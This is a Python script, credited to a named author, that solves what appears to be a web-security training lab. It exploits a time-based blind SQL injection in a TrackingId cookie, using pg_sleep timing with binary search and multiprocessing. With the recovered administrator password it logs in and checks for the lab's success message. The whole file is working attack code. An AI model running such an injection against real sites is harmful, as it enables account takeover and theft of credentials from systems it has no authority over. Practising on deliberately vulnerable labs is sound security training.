import requests
import string
from multiprocessing import Pool
import re
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.tracking_id = None
        self.username = 'administrator'
        self.password = None
        self.csrf = None

    def initiate_first_request(self):
        self.session.get(self.lab_url)
        self.tracking_id = list(self.session.cookies.items())[0][1]

    def send_request(self, position, operator, target_character):
        payload = ('\'%3b SELECT CASE WHEN (SUBSTRING(password, {}, 1) {} \'{}\') THEN pg_sleep(5) ELSE pg_sleep(0) '
                   'END FROM users WHERE username =\'administrator\'--'
                   .format(position, operator, target_character))
        self.session.cookies.set('TrackingId', self.tracking_id + payload)
        response = self.session.get(self.lab_url)
        response_elapsed = int(str(response.elapsed).split(':')[-1].split('.')[0])
        print(response_elapsed)
        if response_elapsed >= 5:
            return True
        else:
            return False

    def binary_search(self, arr, low, high, x):
        while low <= high:
            mid = low + (high - low) // 2
            if self.send_request(x, '=', arr[mid]):
                return mid
            elif self.send_request(x, '<', arr[mid]):
                high = mid - 1
            else:
                low = mid + 1
        return -1

    def worker(self, args):
        position, lowercase_alphanumeric = args
        return [position, self.binary_search(lowercase_alphanumeric, 0, len(lowercase_alphanumeric)-1, position)]

    def exfiltrate_admin_password_using_blind_sql_injection_and_binary_search(self):
        self.password = [''] * 20
        lowercase_alphanumeric = list(string.digits + string.ascii_lowercase)
        positions = [(i + 1, lowercase_alphanumeric) for i in range(20)]
        with Pool(processes=10) as pool:
            results = pool.map(self.worker, positions)
        for result in results:
            position, char_index = result
            self.password[int(position)-1] = lowercase_alphanumeric[char_index]
        self.password = ''.join(self.password)

    def get_csrf_token(self):
        response = self.session.get(self.lab_url + 'login')
        self.csrf = re.search('value="(.*)"', response.text).group(1)

    def sign_in_as_admin(self):
        data = {
            'csrf': self.csrf,
            'username': self.username,
            'password': self.password
        }
        self.session.post(self.lab_url + 'login',  data=data)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.initiate_first_request()
        self.exfiltrate_admin_password_using_blind_sql_injection_and_binary_search()
        self.get_csrf_token()
        self.sign_in_as_admin()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
